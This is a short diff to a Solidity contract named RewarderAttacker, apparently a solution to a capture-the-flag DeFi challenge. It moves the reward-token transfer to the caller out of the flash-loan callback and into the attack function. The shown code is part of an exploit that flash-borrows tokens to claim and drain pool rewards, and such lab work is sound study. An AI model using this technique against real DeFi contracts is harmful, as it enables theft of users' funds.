@@ -28,6 +28,8 @@ contract RewarderAttacker {
     function attack() public {
         // flash loan 1M DVT
         flashLoanerPool.flashLoan(1000000 ether);
+        // send reward tokens received to msg.sender
+        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
     }
 
     function receiveFlashLoan(uint256 amountReceived) public {
@@ -42,7 +44,5 @@ contract RewarderAttacker {
             address(flashLoanerPool),
             dvtToken.balanceOf(address(this))
         );
-        // send reward tokens received to msg.sender
-        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
     }
 }
